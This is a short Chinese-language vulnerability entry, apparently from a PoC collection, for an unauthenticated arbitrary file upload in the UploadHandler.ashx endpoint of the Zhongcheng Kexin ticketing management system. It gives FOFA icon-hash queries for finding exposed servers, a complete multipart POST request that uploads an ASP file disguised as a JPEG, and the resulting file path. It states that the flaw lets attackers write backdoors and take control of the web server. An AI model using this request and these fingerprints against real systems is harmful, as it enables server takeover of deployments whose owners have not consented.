# 中成科信票务管理系统UploadHandler.ashx任意文件上传漏洞

中成科信票务管理系统 UploadHandler.ashx 任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```javascript
icon_hash="1632964065" || icon_hash="-2142050529"
```

## poc

```javascript
POST /WeChat/ashx/UploadHandler.ashx HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7yyQ5XLHOn6WZ6MT
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 
------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
Content-Disposition: form-data; name="file"; filename="1.asp"
Content-Type: image/jpeg
 
<% Response.Write("Hello, World!") %>
------WebKitFormBoundary7yyQ5XLHOn6WZ6MT--
```

![image-20241115101054420](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411151010495.png)

文件路径：`/UploadImage/1.asp`